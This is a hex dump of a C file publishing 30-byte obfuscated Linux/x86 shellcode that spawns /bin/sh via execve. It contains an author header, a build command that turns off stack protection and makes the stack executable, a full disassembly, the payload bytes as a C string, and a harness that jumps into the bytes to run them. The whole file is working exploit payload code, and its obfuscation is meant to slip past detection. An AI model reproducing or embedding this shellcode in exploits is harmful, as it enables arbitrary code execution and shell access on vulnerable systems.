00000000  2f 2a 0a 0a 54 69 74 6c  65 20 20 20 3a 20 4f 62  |/*..Title   : Ob|
00000010  66 75 73 63 61 74 65 64  20 65 78 65 63 76 65 20  |fuscated execve |
00000020  2f 62 69 6e 2f 73 68 20  28 33 30 20 62 79 74 65  |/bin/sh (30 byte|
00000030  73 29 0a 44 61 74 65 20  20 20 20 3a 20 33 72 64  |s).Date    : 3rd|
00000040  20 4a 75 6c 79 20 32 30  31 33 0a 41 75 74 68 6f  | July 2013.Autho|
00000050  72 20 20 3a 20 52 75 73  73 65 6c 6c 20 57 69 6c  |r  : Russell Wil|
00000060  6c 69 73 20 3c 63 6f 64  69 6e 67 75 79 40 67 6d  |lis <codinguy@gm|
00000070  61 69 6c 2e 63 6f 6d 3e  0a 53 79 73 74 65 6d 20  |ail.com>.System |
00000080  20 3a 20 4c 69 6e 75 78  2f 78 38 36 20 28 53 4d  | : Linux/x86 (SM|
00000090  50 20 44 65 62 69 61 6e  20 33 2e 32 2e 34 31 2d  |P Debian 3.2.41-|
000000a0  32 20 69 36 38 36 29 0a  20 20 0a 54 6f 20 62 75  |2 i686).  .To bu|
000000b0  69 6c 64 3a 0a 67 63 63  20 2d 66 6e 6f 2d 73 74  |ild:.gcc -fno-st|
000000c0  61 63 6b 2d 70 72 6f 74  65 63 74 6f 72 20 2d 7a  |ack-protector -z|
000000d0  20 65 78 65 63 73 74 61  63 6b 20 2d 6f 20 73 68  | execstack -o sh|
000000e0  65 6c 6c 63 6f 64 65 20  73 68 65 6c 6c 63 6f 64  |ellcode shellcod|
000000f0  65 2e 63 0a 0a 30 30 30  30 30 30 30 30 20 20 33  |e.c..00000000  3|
00000100  31 43 39 20 20 20 20 20  20 20 20 20 20 20 20 20  |1C9             |
00000110  20 78 6f 72 20 65 63 78  2c 65 63 78 0a 30 30 30  | xor ecx,ecx.000|
00000120  30 30 30 30 32 20 20 46  37 45 39 20 20 20 20 20  |00002  F7E9     |
00000130  20 20 20 20 20 20 20 20  20 69 6d 75 6c 20 65 63  |         imul ec|
00000140  78 0a 30 30 30 30 30 30  30 34 20 20 35 31 20 20  |x.00000004  51  |
00000150  20 20 20 20 20 20 20 20  20 20 20 20 20 20 70 75  |              pu|
00000160  73 68 20 65 63 78 0a 30  30 30 30 30 30 30 35 20  |sh ecx.00000005 |
00000170  20 30 34 30 42 20 20 20  20 20 20 20 20 20 20 20  | 040B           |
00000180  20 20 20 61 64 64 20 61  6c 2c 30 78 62 0a 30 30  |   add al,0xb.00|
00000190  30 30 30 30 30 37 20 20  45 42 30 38 20 20 20 20  |000007  EB08    |
000001a0  20 20 20 20 20 20 20 20  20 20 6a 6d 70 20 73 68  |          jmp sh|
000001b0  6f 72 74 20 30 78 31 31  0a 30 30 30 30 30 30 30  |ort 0x11.0000000|
000001c0  39 20 20 35 45 20 20 20  20 20 20 20 20 20 20 20  |9  5E           |
000001d0  20 20 20 20 20 70 6f 70  20 65 73 69 0a 30 30 30  |     pop esi.000|
000001e0  30 30 30 30 41 20 20 38  37 45 36 20 20 20 20 20  |0000A  87E6     |
000001f0  20 20 20 20 20 20 20 20  20 78 63 68 67 20 65 73  |         xchg es|
00000200  70 2c 65 73 69 0a 30 30  30 30 30 30 30 43 20 20  |p,esi.0000000C  |
00000210  39 39 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |99              |
00000220  20 20 63 64 71 0a 30 30  30 30 30 30 30 44 20 20  |  cdq.0000000D  |
00000230  38 37 44 43 20 20 20 20  20 20 20 20 20 20 20 20  |87DC            |
00000240  20 20 78 63 68 67 20 65  62 78 2c 65 73 70 0a 30  |  xchg ebx,esp.0|
00000250  30 30 30 30 30 30 46 20  20 43 44 38 30 20 20 20  |000000F  CD80   |
00000260  20 20 20 20 20 20 20 20  20 20 20 69 6e 74 20 30  |           int 0|
00000270  78 38 30 0a 30 30 30 30  30 30 31 31 20 20 45 38  |x80.00000011  E8|
00000280  46 33 46 46 46 46 46 46  20 20 20 20 20 20 20 20  |F3FFFFFF        |
00000290  63 61 6c 6c 20 64 77 6f  72 64 20 30 78 39 0a 30  |call dword 0x9.0|
000002a0  30 30 30 30 30 31 36 20  20 32 46 20 20 20 20 20  |0000016  2F     |
000002b0  20 20 20 20 20 20 20 20  20 20 20 64 61 73 0a 30  |           das.0|
000002c0  30 30 30 30 30 31 37 20  20 36 32 36 39 36 45 20  |0000017  62696E |
000002d0  20 20 20 20 20 20 20 20  20 20 20 62 6f 75 6e 64  |           bound|
000002e0  20 65 62 70 2c 5b 65 63  78 2b 30 78 36 65 5d 0a  | ebp,[ecx+0x6e].|
000002f0  30 30 30 30 30 30 31 41  20 20 32 46 20 20 20 20  |0000001A  2F    |
00000300  20 20 20 20 20 20 20 20  20 20 20 20 64 61 73 0a  |            das.|
00000310  30 30 30 30 30 30 31 42  20 20 32 46 20 20 20 20  |0000001B  2F    |
00000320  20 20 20 20 20 20 20 20  20 20 20 20 64 61 73 0a  |            das.|
00000330  30 30 30 30 30 30 31 43  20 20 37 33 36 38 20 20  |0000001C  7368  |
00000340  20 20 20 20 20 20 20 20  20 20 20 20 6a 6e 63 20  |            jnc |
00000350  30 78 38 36 0a 0a 2a 2f  0a 0a 23 69 6e 63 6c 75  |0x86..*/..#inclu|
00000360  64 65 20 3c 73 74 64 69  6f 2e 68 3e 0a 20 0a 75  |de <stdio.h>. .u|
00000370  6e 73 69 67 6e 65 64 20  63 68 61 72 20 63 6f 64  |nsigned char cod|
00000380  65 5b 5d 20 3d 20 5c 0a  22 5c 78 33 31 5c 78 63  |e[] = \."\x31\xc|
00000390  39 5c 78 66 37 5c 78 65  39 5c 78 35 31 5c 78 30  |9\xf7\xe9\x51\x0|
000003a0  34 5c 78 30 62 5c 78 65  62 5c 78 30 38 5c 78 35  |4\x0b\xeb\x08\x5|
000003b0  65 5c 78 38 37 5c 78 65  36 5c 78 39 39 5c 78 38  |e\x87\xe6\x99\x8|
000003c0  37 5c 78 64 63 5c 78 63  64 5c 78 38 30 22 0a 22  |7\xdc\xcd\x80"."|
000003d0  5c 78 65 38 5c 78 66 33  5c 78 66 66 5c 78 66 66  |\xe8\xf3\xff\xff|
000003e0  5c 78 66 66 5c 78 32 66  5c 78 36 32 5c 78 36 39  |\xff\x2f\x62\x69|
000003f0  5c 78 36 65 5c 78 32 66  5c 78 32 66 5c 78 37 33  |\x6e\x2f\x2f\x73|
00000400  5c 78 36 38 22 3b 0a 20  0a 6d 61 69 6e 28 29 0a  |\x68";. .main().|
00000410  7b 0a 20 20 20 20 70 72  69 6e 74 66 28 22 53 68  |{.    printf("Sh|
00000420  65 6c 6c 63 6f 64 65 20  4c 65 6e 67 74 68 3a 20  |ellcode Length: |
00000430  25 64 5c 6e 22 2c 20 73  69 7a 65 6f 66 28 63 6f  |%d\n", sizeof(co|
00000440  64 65 29 2d 31 29 3b 0a  20 20 20 20 69 6e 74 20  |de)-1);.    int |
00000450  28 2a 72 65 74 29 28 29  20 3d 20 28 69 6e 74 28  |(*ret)() = (int(|
00000460  2a 29 28 29 29 63 6f 64  65 3b 0a 20 20 20 20 72  |*)())code;.    r|
00000470  65 74 28 29 3b 0a 7d                              |et();.}|
00000477
